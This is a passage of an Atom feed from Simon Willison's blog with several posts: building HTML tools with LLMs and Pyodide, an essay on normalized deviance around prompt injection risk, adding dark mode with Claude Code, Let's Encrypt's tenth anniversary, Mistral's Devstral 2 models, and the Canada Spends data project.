&lt;strong&gt;&lt;a href="https://tools.simonwillison.net/open-sauce-2025"&gt;open-sauce-2025&lt;/a&gt;&lt;/strong&gt; is my alternative schedule for a conference that includes a downloadable ICS file for adding the schedule to your calendar. See &lt;a href="https://simonwillison.net/2025/Jul/17/vibe-scraping/"&gt;Vibe scraping and vibe coding a schedule app for Open Sauce 2025 entirely on my phone&lt;/a&gt; for more on that project.&lt;/li&gt;
&lt;/ul&gt;
&lt;div style="display: flex; width: 100%; gap: 20px; margin-bottom: 1em;"&gt;
  &lt;a href="https://tools.simonwillison.net/svg-render" style="flex: 1; width: 30%; border: none;"&gt;&lt;img src="https://static.simonwillison.net/static/2025/html-tools/svg-render.jpg" loading="lazy" style="width: 100%; height: auto; object-fit: cover;" alt="screenshot of svg-render" /&gt;&lt;/a&gt;
  &lt;a href="https://tools.simonwillison.net/social-media-cropper" style="flex: 1; width: 30%; border: none;"&gt;&lt;img src="https://static.simonwillison.net/static/2025/html-tools/social-media-cropper.jpg" loading="lazy" style="width: 100%; height: auto; object-fit: cover;" alt="screenshot of social-media-cropper" /&gt;&lt;/a&gt;
  &lt;a href="https://tools.simonwillison.net/open-sauce-2025" style="flex: 1; width: 30%; border: none;"&gt;&lt;img src="https://static.simonwillison.net/static/2025/html-tools/open-sauce-2025.jpg" loading="lazy" style="width: 100%; height: auto; object-fit: cover;" alt="screenshot of open-sauce-2025" /&gt;&lt;/a&gt;
&lt;/div&gt;
&lt;h4 id="pyodide-can-run-python-code-in-the-browser"&gt;Pyodide can run Python code in the browser&lt;/h4&gt;
&lt;p&gt;&lt;a href="https://pyodide.org/"&gt;Pyodide&lt;/a&gt; is a distribution of Python that's compiled to WebAssembly and designed to run directly in browsers. It's an engineering marvel and one of the most underrated corners of the Python world.&lt;/p&gt;
&lt;p&gt;It also cleanly loads from a CDN, which means there's no reason not to use it in HTML tools!&lt;/p&gt;
&lt;p&gt;Even better, the Pyodide project includes &lt;a href="https://github.com/pyodide/micropip"&gt;micropip&lt;/a&gt; - a mechanism that can load extra pure-Python packages from PyPI via CORS.&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;strong&gt;&lt;a href="https://tools.simonwillison.net/pyodide-bar-chart"&gt;pyodide-bar-chart&lt;/a&gt;&lt;/strong&gt; demonstrates running Pyodide, Pandas and matplotlib to render a bar chart directly in the browser.&lt;/li&gt;
&lt;li&gt;
&lt;strong&gt;&lt;a href="https://tools.simonwillison.net/numpy-pyodide-lab"&gt;numpy-pyodide-lab&lt;/a&gt;&lt;/strong&gt; is an experimental interactive tutorial for Numpy.&lt;/li&gt;
&lt;li&gt;
&lt;strong&gt;&lt;a href="https://tools.simonwillison.net/apsw-query"&gt;apsw-query&lt;/a&gt;&lt;/strong&gt; demonstrates the &lt;a href="https://github.com/rogerbinns/apsw"&gt;APSW SQLite library&lt;/a&gt;  running in a browser, using it to show EXPLAIN QUERY plans for SQLite queries.&lt;/li&gt;
&lt;/ul&gt;
&lt;div style="display: flex; width: 100%; gap: 20px; margin-bottom: 1em;"&gt;
  &lt;a href="https://tools.simonwillison.net/pyodide-bar-chart" style="flex: 1; width: 30%; border: none;"&gt;&lt;img src="https://static.simonwillison.net/static/2025/html-tools/pyodide-bar-chart.jpg" loading="lazy" style="width: 100%; height: auto; object-fit: cover;" alt="screenshot of pyodide-bar-chart" /&gt;&lt;/a&gt;
  &lt;a href="https://tools.simonwillison.net/numpy-pyodide-lab" style="flex: 1; width: 30%; border: none;"&gt;&lt;img src="https://static.simonwillison.net/static/2025/html-tools/numpy-pyodide-lab.jpg" loading="lazy" style="width: 100%; height: auto; object-fit: cover;" alt="screenshot of numpy-pyodide-lab" /&gt;&lt;/a&gt;
  &lt;a href="https://tools.simonwillison.net/apsw-query" style="flex: 1; width: 30%; border: none;"&gt;&lt;img src="https://static.simonwillison.net/static/2025/html-tools/apsw-query.jpg" loading="lazy" style="width: 100%; height: auto; object-fit: cover;" alt="screenshot of apsw-query" /&gt;&lt;/a&gt;
&lt;/div&gt;
&lt;h4 id="webassembly-opens-more-possibilities"&gt;WebAssembly opens more possibilities&lt;/h4&gt;
&lt;p&gt;Pyodide is possible thanks to WebAssembly. WebAssembly means that a vast collection of software originally written in other languages can now be loaded in HTML tools as well.&lt;/p&gt;
&lt;p&gt;&lt;a href="https://squoosh.app/"&gt;Squoosh.app&lt;/a&gt; was the first example I saw that convinced me of the power of this pattern - it makes several best-in-class image compression libraries available directly in the browser.&lt;/p&gt;
&lt;p&gt;I've used WebAssembly for a few of my own tools:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;strong&gt;&lt;a href="https://tools.simonwillison.net/ocr"&gt;ocr&lt;/a&gt;&lt;/strong&gt; uses the pre-existing &lt;a href="https://tesseract.projectnaptha.com/"&gt;Tesseract.js&lt;/a&gt; WebAssembly port of the Tesseract OCR engine.&lt;/li&gt;
&lt;li&gt;
&lt;strong&gt;&lt;a href="https://tools.simonwillison.net/sloccount"&gt;sloccount&lt;/a&gt;&lt;/strong&gt; is a port of David Wheeler's Perl and C &lt;a href="https://dwheeler.com/sloccount/"&gt;SLOCCount&lt;/a&gt; utility to the browser, using a big ball of WebAssembly duct tape. &lt;a href="https://simonwillison.net/2025/Oct/22/sloccount-in-webassembly/"&gt;More details here&lt;/a&gt;.&lt;/li&gt;
&lt;li&gt;
&lt;strong&gt;&lt;a href="https://tools.simonwillison.net/micropython"&gt;micropython&lt;/a&gt;&lt;/strong&gt; is my experiment using &lt;a href="https://www.npmjs.com/package/@micropython/micropython-webassembly-pyscript"&gt;@micropython/micropython-webassembly-pyscript&lt;/a&gt; from NPM to run Python code with a smaller initial download than Pyodide.&lt;/li&gt;
&lt;/ul&gt;
&lt;div style="display: flex; width: 100%; gap: 20px; margin-bottom: 1em;"&gt;
  &lt;a href="https://tools.simonwillison.net/ocr" style="flex: 1; width: 30%; border: none;"&gt;&lt;img src="https://static.simonwillison.net/static/2025/html-tools/ocr.jpg" loading="lazy" style="width: 100%; height: auto; object-fit: cover;" alt="screenshot of ocr" /&gt;&lt;/a&gt;
  &lt;a href="https://tools.simonwillison.net/sloccount" style="flex: 1; width: 30%; border: none;"&gt;&lt;img src="https://static.simonwillison.net/static/2025/html-tools/sloccount.jpg" loading="lazy" style="width: 100%; height: auto; object-fit: cover;" alt="screenshot of sloccount" /&gt;&lt;/a&gt;
  &lt;a href="https://tools.simonwillison.net/micropython" style="flex: 1; width: 30%; border: none;"&gt;&lt;img src="https://static.simonwillison.net/static/2025/html-tools/micropython.jpg" loading="lazy" style="width: 100%; height: auto; object-fit: cover;" alt="screenshot of micropython" /&gt;&lt;/a&gt;
&lt;/div&gt;
&lt;h4 id="remix-your-previous-tools"&gt;Remix your previous tools&lt;/h4&gt;
&lt;p&gt;The biggest advantage of having a single public collection of 100+ tools is that it's easy for my LLM assistants to recombine them in interesting ways.&lt;/p&gt;
&lt;p&gt;Sometimes I'll copy and paste a previous tool into the context, but when I'm working with a coding agent I can reference them by name - or tell the agent to search for relevant examples before it starts work.&lt;/p&gt;
&lt;p&gt;The source code of any working tool doubles as clear documentation of how something can be done, including patterns for using editing libraries. An LLM with one or two existing tools in their context is much more likely to produce working code.&lt;/p&gt;
&lt;p&gt;I built &lt;strong&gt;&lt;a href="https://tools.simonwillison.net/pypi-changelog"&gt;pypi-changelog&lt;/a&gt;&lt;/strong&gt; by telling Claude Code:&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;code&gt;Look at the pypi package explorer tool&lt;/code&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;And then, after it had found and read the source code for &lt;a href="https://tools.simonwillison.net/zip-wheel-explorer"&gt;zip-wheel-explorer&lt;/a&gt;:&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;code&gt;Build a new tool pypi-changelog.html which uses the PyPI API to get the wheel URLs of all available versions of a package, then it displays them in a list where each pair has a "Show changes" clickable in between them - clicking on that fetches the full contents of the wheels and displays a nicely rendered diff representing the difference between the two, as close to a standard diff format as you can get with JS libraries from CDNs, and when that is displayed there is a "Copy" button which copies that diff to the clipboard&lt;/code&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;Here's &lt;a href="https://gistpreview.github.io/?9b48fd3f8b99a204ba2180af785c89d2"&gt;the full transcript&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;See &lt;a href="https://simonwillison.net/2024/Mar/30/ocr-pdfs-images/"&gt;Running OCR against PDFs and images directly in your browser&lt;/a&gt; for another detailed example of remixing tools to create something new.&lt;/p&gt;
&lt;h4 id="record-the-prompt-and-transcript"&gt;Record the prompt and transcript&lt;/h4&gt;
&lt;p&gt;I like keeping (and publishing) records of everything I do with LLMs, to help me grow my skills at using them over time.&lt;/p&gt;
&lt;p&gt;For HTML tools I built by chatting with an LLM platform directly I use the "share" feature for those platforms.&lt;/p&gt;
&lt;p&gt;For Claude Code or Codex CLI or other coding agents I copy and paste the full transcript from the terminal into my &lt;a href="https://tools.simonwillison.net/terminal-to-html"&gt;terminal-to-html&lt;/a&gt; tool and share that using a Gist.&lt;/p&gt;
&lt;p&gt;In either case I include links to those transcripts in the commit message when I save the finished tool to my repository. You can see those &lt;a href="https://tools.simonwillison.net/colophon"&gt;in my tools.simonwillison.net colophon&lt;/a&gt;.&lt;/p&gt;
&lt;h4 id="go-forth-and-build"&gt;Go forth and build&lt;/h4&gt;
&lt;p&gt;I've had &lt;em&gt;so much fun&lt;/em&gt; exploring the capabilities of LLMs in this way over the past year and a half, and building tools in this way has been invaluable in helping me understand both the potential for building tools with HTML and the capabilities of the LLMs that I'm building them with.&lt;/p&gt;
&lt;p&gt;If you're interested in starting your own collection I highly recommend it! All you need to get started is a free GitHub repository with GitHub Pages enabled (Settings -&amp;gt; Pages -&amp;gt; Source -&amp;gt; Deploy from a branch -&amp;gt; main) and you can start copying in &lt;code&gt;.html&lt;/code&gt; pages generated in whatever manner you like.&lt;/p&gt;

&lt;p&gt;&lt;small&gt;&lt;strong&gt;Bonus transcript&lt;/strong&gt;: Here's &lt;a href="http://gistpreview.github.io/?1b8cba6a8a21110339cbde370e755ba0"&gt;how I used Claude Code&lt;/a&gt; and &lt;a href="https://shot-scraper.datasette.io/"&gt;shot-scraper&lt;/a&gt; to add the screenshots to this post.&lt;/small&gt;&lt;/p&gt;
    
        &lt;p&gt;Tags: &lt;a href="https://simonwillison.net/tags/definitions"&gt;definitions&lt;/a&gt;, &lt;a href="https://simonwillison.net/tags/github"&gt;github&lt;/a&gt;, &lt;a href="https://simonwillison.net/tags/html"&gt;html&lt;/a&gt;, &lt;a href="https://simonwillison.net/tags/javascript"&gt;javascript&lt;/a&gt;, &lt;a href="https://simonwillison.net/tags/projects"&gt;projects&lt;/a&gt;, &lt;a href="https://simonwillison.net/tags/tools"&gt;tools&lt;/a&gt;, &lt;a href="https://simonwillison.net/tags/ai"&gt;ai&lt;/a&gt;, &lt;a href="https://simonwillison.net/tags/webassembly"&gt;webassembly&lt;/a&gt;, &lt;a href="https://simonwillison.net/tags/generative-ai"&gt;generative-ai&lt;/a&gt;, &lt;a href="https://simonwillison.net/tags/llms"&gt;llms&lt;/a&gt;, &lt;a href="https://simonwillison.net/tags/ai-assisted-programming"&gt;ai-assisted-programming&lt;/a&gt;, &lt;a href="https://simonwillison.net/tags/vibe-coding"&gt;vibe-coding&lt;/a&gt;, &lt;a href="https://simonwillison.net/tags/coding-agents"&gt;coding-agents&lt;/a&gt;, &lt;a href="https://simonwillison.net/tags/claude-code"&gt;claude-code&lt;/a&gt;&lt;/p&gt;
    

</summary><category term="definitions"/><category term="github"/><category term="html"/><category term="javascript"/><category term="projects"/><category term="tools"/><category term="ai"/><category term="webassembly"/><category term="generative-ai"/><category term="llms"/><category term="ai-assisted-programming"/><category term="vibe-coding"/><category term="coding-agents"/><category term="claude-code"/></entry><entry><title>The Normalization of Deviance in AI</title><link href="https://simonwillison.net/2025/Dec/10/normalization-of-deviance/#atom-everything" rel="alternate"/><published>2025-12-10T20:18:58+00:00</published><updated>2025-12-10T20:18:58+00:00</updated><id>https://simonwillison.net/2025/Dec/10/normalization-of-deviance/#atom-everything</id><summary type="html">
    
&lt;p&gt;&lt;strong&gt;&lt;a href="https://embracethered.com/blog/posts/2025/the-normalization-of-deviance-in-ai/"&gt;The Normalization of Deviance in AI&lt;/a&gt;&lt;/strong&gt;&lt;/p&gt;
This thought-provoking essay from Johann Rehberger directly addresses something that I’ve been worrying about for quite a while: in the absence of any headline-grabbing examples of prompt injection vulnerabilities causing real economic harm, is anyone going to care?&lt;/p&gt;
&lt;p&gt;Johann describes the concept of the “Normalization of Deviance” as directly applying to this question.&lt;/p&gt;
&lt;p&gt;Coined by &lt;a href="https://en.wikipedia.org/wiki/Diane_Vaughan"&gt;Diane Vaughan&lt;/a&gt;, the key idea here is that organizations that get away with “deviance” - ignoring safety protocols or otherwise relaxing their standards - will start baking that unsafe attitude into their culture. This can work fine… until it doesn’t. The Space Shuttle Challenger disaster has been partially blamed on this class of organizational failure.&lt;/p&gt;
&lt;p&gt;As Johann puts it:&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;In the world of AI, we observe companies treating probabilistic, non-deterministic, and sometimes adversarial model outputs as if they were reliable, predictable, and safe.&lt;/p&gt;
&lt;p&gt;Vendors are normalizing trusting LLM output, but current understanding violates the assumption of reliability.&lt;/p&gt;
&lt;p&gt;The model will not consistently follow instructions, stay aligned, or maintain context integrity. This is especially true if there is an attacker in the loop (e.g indirect prompt injection).&lt;/p&gt;
&lt;p&gt;However, we see more and more systems allowing untrusted output to take consequential actions. Most of the time it goes well, and over time vendors and organizations lower their guard or skip human oversight entirely, because “it worked last time.”&lt;/p&gt;
&lt;p&gt;This dangerous bias is the fuel for normalization: organizations confuse the absence of a successful attack with the presence of robust security.&lt;/p&gt;
&lt;/blockquote&gt;


    &lt;p&gt;Tags: &lt;a href="https://simonwillison.net/tags/security"&gt;security&lt;/a&gt;, &lt;a href="https://simonwillison.net/tags/ai"&gt;ai&lt;/a&gt;, &lt;a href="https://simonwillison.net/tags/prompt-injection"&gt;prompt-injection&lt;/a&gt;, &lt;a href="https://simonwillison.net/tags/generative-ai"&gt;generative-ai&lt;/a&gt;, &lt;a href="https://simonwillison.net/tags/llms"&gt;llms&lt;/a&gt;, &lt;a href="https://simonwillison.net/tags/johann-rehberger"&gt;johann-rehberger&lt;/a&gt;, &lt;a href="https://simonwillison.net/tags/ai-ethics"&gt;ai-ethics&lt;/a&gt;&lt;/p&gt;



</summary><category term="security"/><category term="ai"/><category term="prompt-injection"/><category term="generative-ai"/><category term="llms"/><category term="johann-rehberger"/><category term="ai-ethics"/></entry><entry><title>Dark mode</title><link href="https://simonwillison.net/2025/Dec/10/dark-mode/#atom-everything" rel="alternate"/><published>2025-12-10T16:05:34+00:00</published><updated>2025-12-10T16:05:34+00:00</updated><id>https://simonwillison.net/2025/Dec/10/dark-mode/#atom-everything</id><summary type="html">
    &lt;p&gt;I've never been particularly invested dark v.s. light mode but I get enough people complaining that this site is "blinding" that I decided to see if Claude Code for web could produce a useful dark mode from my existing CSS. It did &lt;a href="https://github.com/simonw/simonwillisonblog/pull/572/files"&gt;a decent job&lt;/a&gt;, using CSS properties, &lt;code&gt;@media (prefers-color-scheme: dark)&lt;/code&gt; and a &lt;code&gt;data-theme="dark"&lt;/code&gt; attribute based on this prompt:&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;code&gt;Add a dark theme which is triggered by user media preferences but can also be switched on using localStorage - then put a little icon in the footer for toggling it between default auto, forced regular and forced dark mode&lt;/code&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;The site defaults to picking up the user's preferences, but there's also a toggle in the footer which switches between auto, forced-light and forced-dark. Here's an animated demo:&lt;/p&gt;
&lt;p&gt;&lt;img alt="This site on mobile. Clicking the icon in the footer switches to a black background with readable text." src="https://static.simonwillison.net/static/2025/dark-mode.gif" /&gt;&lt;/p&gt;
&lt;p&gt;I had Claude Code &lt;a href="https://gistpreview.github.io/?5ea34de3e999bd32d0f86beef4bd803d"&gt;make me that GIF&lt;/a&gt; from two static screenshots - it used this ImageMagick recipe:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;magick -delay 300 -loop 0 one.png two.png \
    -colors 128 -layers Optimize dark-mode.gif
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;The CSS ended up with some duplication due to the need to handle both the media preference and the explicit user selection. We &lt;a href="https://github.com/simonw/simonwillisonblog/commit/d4bc7573775960a630145a287d854b8569da6f72#diff-5acc582e2a25639d184d784747a69ff9b30061aca8d5913d9c7e67452e715e08"&gt;fixed that with Cog&lt;/a&gt;.&lt;/p&gt;

    &lt;p&gt;Tags: &lt;a href="https://simonwillison.net/tags/css"&gt;css&lt;/a&gt;, &lt;a href="https://simonwillison.net/tags/coding-agents"&gt;coding-agents&lt;/a&gt;, &lt;a href="https://simonwillison.net/tags/ai-assisted-programming"&gt;ai-assisted-programming&lt;/a&gt;, &lt;a href="https://simonwillison.net/tags/claude"&gt;claude&lt;/a&gt;, &lt;a href="https://simonwillison.net/tags/claude-code"&gt;claude-code&lt;/a&gt;, &lt;a href="https://simonwillison.net/tags/design"&gt;design&lt;/a&gt;, &lt;a href="https://simonwillison.net/tags/llms"&gt;llms&lt;/a&gt;, &lt;a href="https://simonwillison.net/tags/ai"&gt;ai&lt;/a&gt;, &lt;a href="https://simonwillison.net/tags/generative-ai"&gt;generative-ai&lt;/a&gt;&lt;/p&gt;



</summary><category term="css"/><category term="coding-agents"/><category term="ai-assisted-programming"/><category term="claude"/><category term="claude-code"/><category term="design"/><category term="llms"/><category term="ai"/><category term="generative-ai"/></entry><entry><title>10 Years of Let's Encrypt</title><link href="https://simonwillison.net/2025/Dec/10/lets-encrypt/#atom-everything" rel="alternate"/><published>2025-12-10T00:34:15+00:00</published><updated>2025-12-10T00:34:15+00:00</updated><id>https://simonwillison.net/2025/Dec/10/lets-encrypt/#atom-everything</id><summary type="html">
    
&lt;p&gt;&lt;strong&gt;&lt;a href="https://letsencrypt.org/2025/12/09/10-years"&gt;10 Years of Let&amp;#x27;s Encrypt&lt;/a&gt;&lt;/strong&gt;&lt;/p&gt;
Internet Security Research Group co-founder and Executive Director Josh Aas:&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;On September 14, 2015, &lt;a href="https://crt.sh/?id=9314793"&gt;our first publicly-trusted certificate went live&lt;/a&gt;. [...] Today, Let’s Encrypt is the largest certificate authority in the world in terms of certificates issued, the ACME protocol we helped create and standardize is integrated throughout the server ecosystem, and we’ve become a household name among system administrators. We’re closing in on protecting one billion web sites.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;Their growth rate and numbers are wild:&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;In March 2016, we issued our one millionth certificate. Just two years later, in September 2018, we were issuing a million certificates every day. In 2020 we reached a billion total certificates issued and as of late 2025 we’re frequently issuing ten million certificates per day.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;According to &lt;a href="https://letsencrypt.org/stats/"&gt;their stats&lt;/a&gt; the amount of Firefox traffic protected by HTTPS doubled from 39% at the start of 2016 to ~80% today. I think it's difficult to over-estimate the impact Let's Encrypt has had on the security of the web.

    &lt;p&gt;&lt;small&gt;&lt;/small&gt;Via &lt;a href="https://news.ycombinator.com/item?id=46208962"&gt;Hacker News&lt;/a&gt;&lt;/small&gt;&lt;/p&gt;


    &lt;p&gt;Tags: &lt;a href="https://simonwillison.net/tags/https"&gt;https&lt;/a&gt;, &lt;a href="https://simonwillison.net/tags/security"&gt;security&lt;/a&gt;&lt;/p&gt;



</summary><category term="https"/><category term="security"/></entry><entry><title>Devstral 2</title><link href="https://simonwillison.net/2025/Dec/9/devstral-2/#atom-everything" rel="alternate"/><published>2025-12-09T23:58:27+00:00</published><updated>2025-12-09T23:58:27+00:00</updated><id>https://simonwillison.net/2025/Dec/9/devstral-2/#atom-everything</id><summary type="html">
    
&lt;p&gt;&lt;strong&gt;&lt;a href="https://mistral.ai/news/devstral-2-vibe-cli"&gt;Devstral 2&lt;/a&gt;&lt;/strong&gt;&lt;/p&gt;
Two new models from Mistral today: Devstral 2 and Devstral Small 2 - both focused on powering coding agents such as Mistral's newly released Mistral Vibe which &lt;a href="https://simonwillison.net/2025/Dec/9/mistral-vibe/"&gt;I wrote about earlier today&lt;/a&gt;.&lt;/p&gt;
&lt;blockquote&gt;
&lt;ul&gt;
&lt;li&gt;Devstral 2: SOTA open model for code agents with a fraction of the parameters of its competitors and achieving 72.2% on SWE-bench Verified.&lt;/li&gt;
&lt;li&gt;Up to 7x more cost-efficient than Claude Sonnet at real-world tasks.&lt;/li&gt;
&lt;/ul&gt;
&lt;/blockquote&gt;
&lt;p&gt;Devstral 2 is a 123B model released under a janky license - it's "modified MIT" where &lt;a href="https://huggingface.co/mistralai/Devstral-2-123B-Instruct-2512/blob/main/LICENSE"&gt;the modification&lt;/a&gt; is:&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;You are not authorized to exercise any rights under this license if the global consolidated monthly revenue of your company (or that of your employer) exceeds $20 million (or its equivalent in another currency) for the preceding month. This restriction in (b) applies to the Model and any derivatives, modifications, or combined works based on it, whether provided by Mistral AI or by a third party. [...]&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;Mistral Small 2 is under a proper Apache 2 license with no weird strings attached. It's a 24B model which is &lt;a href="https://huggingface.co/mistralai/Devstral-Small-2-24B-Instruct-2512"&gt;51.6GB on Hugging Face&lt;/a&gt; and should quantize to significantly less.&lt;/p&gt;
&lt;p&gt;I tried out the larger model via &lt;a href="https://github.com/simonw/llm-mistral"&gt;my llm-mistral plugin&lt;/a&gt; like this:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;llm install llm-mistral
llm mistral refresh
llm -m mistral/devstral-2512 "Generate an SVG of a pelican riding a bicycle"
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;img alt="Bicycle looks a bit like a cybertruck" src="https://static.simonwillison.net/static/2025/devstral-2.jpg" /&gt;&lt;/p&gt;
&lt;p&gt;For a ~120B model that one is pretty good!&lt;/p&gt;
&lt;p&gt;Here's the same prompt with &lt;code&gt;-m mistral/labs-devstral-small-2512&lt;/code&gt; for the API hosted version of Devstral Small 2:&lt;/p&gt;
&lt;p&gt;&lt;img alt="A small white pelican on what looks more like a child's cart." src="https://static.simonwillison.net/static/2025/devstral-small-2.jpg" /&gt;&lt;/p&gt;
&lt;p&gt;Again, a decent result given the small parameter size. For comparison, &lt;a href="https://simonwillison.net/2025/Jun/20/mistral-small-32/"&gt;here's what I got&lt;/a&gt; for the 24B Mistral Small 3.2 earlier this year.


    &lt;p&gt;Tags: &lt;a href="https://simonwillison.net/tags/ai"&gt;ai&lt;/a&gt;, &lt;a href="https://simonwillison.net/tags/generative-ai"&gt;generative-ai&lt;/a&gt;, &lt;a href="https://simonwillison.net/tags/llms"&gt;llms&lt;/a&gt;, &lt;a href="https://simonwillison.net/tags/llm"&gt;llm&lt;/a&gt;, &lt;a href="https://simonwillison.net/tags/mistral"&gt;mistral&lt;/a&gt;, &lt;a href="https://simonwillison.net/tags/pelican-riding-a-bicycle"&gt;pelican-riding-a-bicycle&lt;/a&gt;, &lt;a href="https://simonwillison.net/tags/llm-release"&gt;llm-release&lt;/a&gt;, &lt;a href="https://simonwillison.net/tags/janky-licenses"&gt;janky-licenses&lt;/a&gt;&lt;/p&gt;



</summary><category term="ai"/><category term="generative-ai"/><category term="llms"/><category term="llm"/><category term="mistral"/><category term="pelican-riding-a-bicycle"/><category term="llm-release"/><category term="janky-licenses"/></entry><entry><title>Under the hood of Canada Spends with Brendan Samek</title><link href="https://simonwillison.net/2025/Dec/9/canada-spends/#atom-everything" rel="alternate"/><published>2025-12-09T23:52:05+00:00</published><updated>2025-12-09T23:52:05+00:00</updated><id>https://simonwillison.net/2025/Dec/9/canada-spends/#atom-everything</id><summary type="html">
    &lt;p&gt;I talked to Brendan Samek about &lt;a href="https://canadaspends.com/"&gt;Canada Spends&lt;/a&gt;, a project from &lt;a href="https://www.buildcanada.com/"&gt;Build Canada&lt;/a&gt; that makes Canadian government financial data accessible and explorable using a combination of Datasette, a neat custom frontend, Ruby ingestion scripts, &lt;a href="https://sqlite-utils.datasette.io/"&gt;sqlite-utils&lt;/a&gt; and pieces of LLM-powered PDF extraction.&lt;/p&gt;
&lt;p&gt;Here's &lt;a href="https://www.youtube.com/watch?v=T8xiMgmb8po"&gt;the video on YouTube&lt;/a&gt;.&lt;/p&gt;
&lt;iframe style="margin-bottom: 1.5em;" width="560" height="315" src="https://www.youtube-nocookie.com/embed/T8xiMgmb8po" title="YouTube video player" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" referrerpolicy="strict-origin-when-cross-origin" allowfullscreen="allowfullscreen"&gt; &lt;/iframe&gt;

&lt;p&gt;Sections within that video:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;a href="https://www.youtube.com/watch?v=T8xiMgmb8po&amp;amp;t=177s"&gt;02:57&lt;/a&gt; Data sources and the PDF problem&lt;/li&gt;
&lt;li&gt;
&lt;a href="https://www.youtube.com/watch?v=T8xiMgmb8po&amp;amp;t=351s"&gt;05:51&lt;/a&gt; Crowdsourcing financial data across Canada&lt;/li&gt;
&lt;li&gt;
&lt;a href="https://www.youtube.com/watch?v=T8xiMgmb8po&amp;amp;t=447s"&gt;07:27&lt;/a&gt; Datasette demo: Search and facets&lt;/li&gt;
&lt;li&gt;
&lt;a href="https://www.youtube.com/watch?v=T8xiMgmb8po&amp;amp;t=753s"&gt;12:33&lt;/a&gt; Behind the scenes: Ingestion code&lt;/li&gt;
&lt;li&gt;
&lt;a href="https://www.youtube.com/watch?v=T8xiMgmb8po&amp;amp;t=1044s"&gt;17:24&lt;/a&gt; Data quality horror stories&lt;/li&gt;
&lt;li&gt;
&lt;a href="https://www.youtube.com/watch?v=T8xiMgmb8po&amp;amp;t=1246s"&gt;20:46&lt;/a&gt; Using Gemini to extract PDF data&lt;/li&gt;
&lt;li&gt;
&lt;a href="https://www.youtube.com/watch?v=T8xiMgmb8po&amp;amp;t=1524s"&gt;25:24&lt;/a&gt; Why SQLite is perfect for data distribution&lt;/li&gt;
&lt;/ul&gt;
&lt;h4 id="build-canada-and-canada-spends"&gt;Build Canada and Canada Spends&lt;/h4&gt;
&lt;p&gt;&lt;a href="https://www.buildcanada.com/"&gt;Build Canada&lt;/a&gt; is a volunteer-driven non-profit that launched in February 2025 - here's &lt;a href="https://www.canadianaffairs.news/2025/09/26/builders-at-the-gate-inside-the-civic-movement-to-jolt-canada-out-of-stagnation/"&gt;some background information&lt;/a&gt; on the organization, which has a strong pro-entrepreneurship and pro-technology angle.&lt;/p&gt;
&lt;p&gt;&lt;a href="https://canadaspends.com/"&gt;Canada Spends&lt;/a&gt; is their project to make Canadian government financial data more accessible and explorable. It includes a tax sources and sinks visualizer and a searchable database of government contracts, plus a collection of tools covering financial data from different levels of government.&lt;/p&gt;
&lt;h4 id="datasette-for-data-exploration"&gt;Datasette for data exploration&lt;/h4&gt;
&lt;p&gt;The project maintains a Datasette instance at &lt;a href="https://api.canadasbuilding.com/"&gt;api.canadasbilding.com&lt;/a&gt; containing the data they have gathered and processed from multiple data sources - currently more than 2 million rows plus a combined search index across a denormalized copy of that data.&lt;/p&gt;
&lt;p&gt;&lt;img src="https://static.simonwillison.net/static/2025/api-canadasbuilding-com-canada-spends.jpg" alt="  Datasette UI for a canada-spends database.  aggregated-contracts-under-10k:  year, contract_goods_number_of, contracts_goods_original_value, contracts_goods_amendment_value, contract_service_number_of, contracts_service_original_value, contracts_service_amendment_value, contract_construction_number_of, contracts_construction_original_value, contracts_construction_amendment_value, acquisition_card_transactions_number_of, acquisition_card_transactions_total_value, owner_org, owner_org_title  487 rows cihr_grants  external_id, title, project_lead_name, co_researchers, institution, province, country, competition_year, award_amount, program, program_type, theme, research_subject, keywords, abstract, duration, source_url  53,420 rows contracts-over-10k:   reference_number, procurement_id, vendor_name, vendor_postal_code, buyer_name, contract_date, economic_object_code, description_en, description_fr, contract_period_start, delivery_date, contract_value, original_value, amendment_value, comments_en, comments_fr, additional_comments_en, additional_comments_fr, agreement_type_code, trade_agreement, land_claims, commodity_type, commodity_code, country_of_vendor, solicitation_procedure, limited_tendering_reason, trade_agreement_exceptions, indigenous_business, indigenous_business_excluding_psib, intellectual_property, potential_commercial_exploitation, former_public_servant, contracting_entity, standing_offer_number, instrument_type, ministers_office, number_of_bids, article_6_exceptions, award_criteria, socioeconomic_indicator, reporting_period, owner_org, owner_org_title  1,172,575 rows global_affairs_grants:   id, projectNumber, dateModified, title, description, status, start, end, countries, executingAgencyPartner, DACSectors, maximumContribution, ContributingOrganization, expectedResults, resultsAchieved, aidType, collaborationType, financeType, flowType, reportingOrganisation, programName, selectionMechanism, policyMarkers, regions, alternameImPositions, budgets, Locations, otherIdentifiers, participatingOrgs, programDataStructure, relatedActivities, transactions  2,378 rows nserc_grants:   title, award_summary, application_id, competition_year, fiscal_year, project_lead_name, institution, department, province, award_amount, installment, program, selection_committee, research_subject, area_of_application, co-researchers, partners, external_id, source_url  701,310 rows sshrc_grants:   id, title, program, fiscal_year, competition_year, applicant, organization, amount, discipline, area_of_research, co_applicant, keywords, source_url  213,085 rows transfers:   FSCL_YR, MINC, MINE, MINF, DepartmentNumber-Numéro-de-Ministère, DEPT_EN_DESC, DEPT_FR_DESC, RCPNT_CLS_EN_DESC, RCPNT_CLS_FR_DESC, RCPNT_NML_EN_DESC, 